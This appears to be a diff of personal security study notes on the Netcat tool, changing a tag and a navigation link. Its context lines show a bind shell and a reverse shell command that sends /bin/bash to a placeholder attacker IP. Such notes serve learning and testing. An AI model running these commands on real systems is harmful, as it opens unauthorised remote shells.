@@ -1,4 +1,3 @@
- #tools
 ##  Netcat (nc)
 
 Netcat is a versatile networking tool used for reading from and writing to network connections using TCP or UDP.
@@ -191,5 +190,6 @@ nc -nlvp <port> -e /bin/bash
 nc <attacker_ip> <port> -e /bin/bash
 ```
 
----
+### [[02- Socat|Next]]
+
 
